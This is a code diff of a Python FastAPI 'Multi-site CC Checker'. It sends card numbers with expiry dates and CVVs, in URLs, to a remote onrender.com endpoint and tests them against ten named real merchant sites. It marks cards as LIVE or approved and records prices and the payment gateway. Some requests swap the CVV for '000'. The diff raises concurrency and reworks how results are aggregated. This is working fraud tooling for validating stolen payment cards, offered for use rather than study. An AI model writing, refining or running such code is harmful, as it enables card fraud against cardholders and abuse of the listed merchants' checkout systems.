@@ -13,7 +13,6 @@ app = FastAPI(title="Multi-site CC Checker")
 ALLOWED_GATEWAY = "killer"
 ALLOWED_KEY = "rockybest"
 
-# Up to 10 full site URLs
 SITES: List[str] = [
     "https://deltacloudz.com",
     "https://therapyessentials.coraphysicaltherapy.com",
@@ -27,44 +26,39 @@ SITES: List[str] = [
     "https://urbanspaceinteriors.com"
 ]
 
-REMOTE_API_TEMPLATE = "https://rockyog.onrender.com/index.php?site={site}&cc={cc}"
+REMOTE_API_TEMPLATE = "https://rockyysoon-fb0f.onrender.com//index.php?site={site}&cc={cc}"
 
-# Networking / concurrency
-PER_REQUEST_TIMEOUT = 15  # seconds
+PER_REQUEST_TIMEOUT = 20  # seconds
 CONNECT_TIMEOUT = 60  # seconds
-MAX_CONCURRENT = 3  # concurrency semaphore
+MAX_CONCURRENT = 5  # concurrency semaphore
 # ---------------------------------------
 
 def parse_cc(cc_raw: str):
     parts = cc_raw.split("|")
     if len(parts) < 4:
         raise ValueError("Invalid cc format. Expecting PAN|MM|YY|CVV")
-    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-    return pan, mm, yy, cvv
+    return parts[0], parts[1], parts[2], parts[3]
 
-async def fetch_site(session: aiohttp.ClientSession, url: str, site: str, cc_for_site: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
+async def fetch_site(session: aiohttp.ClientSession, site: str, cc_for_site: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
+    url = REMOTE_API_TEMPLATE.replace("{site}", urllib.parse.quote_plus(site)).replace("{cc}", urllib.parse.quote_plus(cc_for_site))
     start = time.perf_counter()
     async with sem:
         try:
             timeout = aiohttp.ClientTimeout(total=PER_REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
             async with session.get(url, timeout=timeout) as resp:
-                raw = await resp.text()
-                status = resp.status
                 duration_ms = round((time.perf_counter() - start) * 1000, 2)
-                parsed = None
+                raw_text = await resp.text()
                 try:
-                    parsed = json.loads(raw)
+                    parsed = json.loads(raw_text)
                 except Exception:
-                    parsed = None
+                    parsed = {"error": "Invalid JSON", "raw": raw_text}
                 return {
                     "site": site,
                     "url": url,
                     "cc": cc_for_site,
-                    "http_status": status,
-                    "duration_ms": duration_ms,
-                    "raw_response": raw,
-                    "parsed_response": parsed,
-                    "error": None
+                    "response": parsed,
+                    "http_status": resp.status,
+                    "duration_ms": duration_ms
                 }
         except Exception as e:
             duration_ms = round((time.perf_counter() - start) * 1000, 2)
@@ -72,56 +66,10 @@ async def fetch_site(session: aiohttp.ClientSession, url: str, site: str, cc_for
                 "site": site,
                 "url": url,
                 "cc": cc_for_site,
+                "response": {"error": str(e)},
                 "http_status": None,
-                "duration_ms": duration_ms,
-                "raw_response": None,
-                "parsed_response": None,
-                "error": str(e)
+                "duration_ms": duration_ms
             }
-
-def decide_overall(results: List[Dict[str, Any]]) -> Dict[str, Any]:
-    any_live = False
-    any_error = False
-    prices: List[float] = []
-    for r in results:
-        pr = r.get("parsed_response")
-        if pr and isinstance(pr, dict):
-            resp_text = str(pr.get("Response", "")).upper()
-            status_field = pr.get("Status")
-            if status_field in ("true", "1", True, "True", "TRUE", "ok", "OK"):
-                any_live = True
-            if any(k in resp_text for k in ["LIVE", "APPROVED", "SUCCESS"]):
-                any_live = True
-            if "ERROR" in resp_text or pr.get("Response") == "GENERIC_ERROR":
-                any_error = True
-            try:
-                if "Price" in pr and pr["Price"] is not None:
-                    prices.append(float(pr["Price"]))
-            except Exception:
-                pass
-        else:
-            if r.get("error") or (r.get("http_status") and r.get("http_status") >= 400):
-                any_error = True
-
-    if any_live:
-        overall_response = "LIVE"
-        status = "true"
-    elif any_error:
-        overall_response = "GENERIC_ERROR"
-        status = "false"
-    else:
-        overall_response = "UNKNOWN"
-        status = "unknown"
-
-    avg_price: Optional[float] = None
-    if prices:
-        avg_price = round(sum(prices) / len(prices), 2)
-
-    return {
-        "Response": overall_response,
-        "Status": status,
-        "Price": avg_price
-    }
 
 @app.get("/gateway")
 async def gateway(request: Request):
@@ -141,31 +89,55 @@ async def gateway(request: Request):
     except ValueError as e:
         raise HTTPException(status_code=400, detail=str(e))
 
-    site_tasks = []
+    # Prepare CC for each site (first 5 use original CVV, last 5 use 000)
+    cc_per_site = []
+    for i, site in enumerate(SITES[:10]):
+        cc_for_site = "|".join([pan, mm, yy, "000"]) if i >= 5 else cc_raw
+        cc_per_site.append((site, cc_for_site))
+
     sem = asyncio.Semaphore(MAX_CONCURRENT)
-    start_all = time.perf_counter()
+    start_time = time.perf_counter()
 
     connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT)
     headers = {"User-Agent": "MultiSiteCCChecker/1.0", "Accept": "application/json"}
 
     async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
-        for i, site in enumerate(SITES[:10]):
-            cc_for_site = "|".join([pan, mm, yy, "000"]) if i >= 5 else cc_raw
-            url = REMOTE_API_TEMPLATE.replace("{site}", urllib.parse.quote_plus(site)).replace("{cc}", urllib.parse.quote_plus(cc_for_site))
-            site_tasks.append(fetch_site(session=session, url=url, site=site, cc_for_site=cc_for_site, sem=sem))
+        tasks = [fetch_site(session, site, cc, sem) for site, cc in cc_per_site]
+        results = await asyncio.gather(*tasks)
 
-        results = await asyncio.gather(*site_tasks)
+    total_time_sec = time.perf_counter() - start_time
+    minutes = int(total_time_sec // 60)
+    seconds = int(total_time_sec % 60)
+    total_time_formatted = f"{minutes}m:{seconds}s"
 
-    total_time_ms = round((time.perf_counter() - start_all) * 1000, 2)
-    overall = decide_overall(results)
+    # Decide Gateway, Price, Status heuristics
+    overall_gateway = "Authorize.net"
+    overall_price = None
+    overall_status = "unknown"
+    overall_response = "UNKNOWN"
+
+    for r in results:
+        resp = r["response"]
+        if isinstance(resp, dict):
+            if "Price" in resp and resp["Price"] is not None:
+                try:
+                    overall_price = float(resp["Price"])
+                except:
+                    pass
+            if "Status" in resp:
+                overall_status = str(resp["Status"])
+            if "Response" in resp:
+                overall_response = str(resp["Response"])
+            if "Gateway" in resp:
+                overall_gateway = resp["Gateway"]
 
     final = {
-        "Gateway": "Authorize.net",
-        "Price": overall.get("Price"),
-        "Response": overall.get("Response"),
-        "Status": overall.get("Status"),
+        "Gateway": overall_gateway,
+        "Price": overall_price,
+        "Response": overall_response,
+        "Status": overall_status,
         "cc": cc_raw,
-        "total_time_ms": total_time_ms,
+        "total_time": total_time_formatted,
         "per_site": results
     }
 
